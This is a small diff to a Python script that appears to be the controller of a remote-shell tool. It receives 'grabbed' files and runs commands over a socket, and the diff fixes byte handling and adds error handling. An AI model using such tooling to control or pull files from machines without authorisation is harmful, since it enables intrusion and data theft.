@@ -12,11 +12,11 @@ def transfer(connection, command):
         while True:
             try:
                 data = connection.recv(1024)
-                if 'File not found' in data.decode():
+                if b'File not found' in data:
                     print('[-] File not found')
                     return
 
-                if data.decode().endswith('DONE'):
+                if data.endswith(b'DONE'):
                     print('[+] File grabbed successfully.')
                     break
                 
@@ -39,6 +39,8 @@ def execute_command(conn, command):
     except KeyboardInterrupt as kre:
         print('\n[+] Exiting ...')
         exit()
+    except Exception as e:
+        print(f'[-] Something went wrong {str(e)}')
 
 def listen():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
